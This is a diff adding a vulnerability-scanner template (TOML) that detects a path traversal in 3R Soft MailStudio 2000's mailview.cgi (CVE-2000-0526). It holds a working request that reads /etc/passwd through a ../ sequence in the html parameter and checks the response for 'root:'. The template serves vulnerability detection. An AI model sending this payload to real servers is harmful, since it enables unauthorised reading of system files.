@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测 3R Soft MailStudio 2000 2.0 及更早版本的 mailview.cgi CGI 程序的路径遍历漏洞。通过在 html 参数中嵌入 (..)/ 等对字符串构造目录遍历序列，绕过目录限制读取服务器文件系统上的任意文件（如 /etc/passwd）。"
+id = "POC-AVE-2000-0437"
+name = "CVE-2000-0526 3R Soft MailStudio 2000 2.0 任意文件访问 PoC"
+severity = "medium"
+tags = ["ave-2000-0437"]
+vuln_id = [
+    "CVE-2000-0526",
+    "AVE-2000-0437",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/mailview.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "cmd=view&fldrname=inbox&select=1&html=../../../../../../etc/passwd"
+type = "form"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
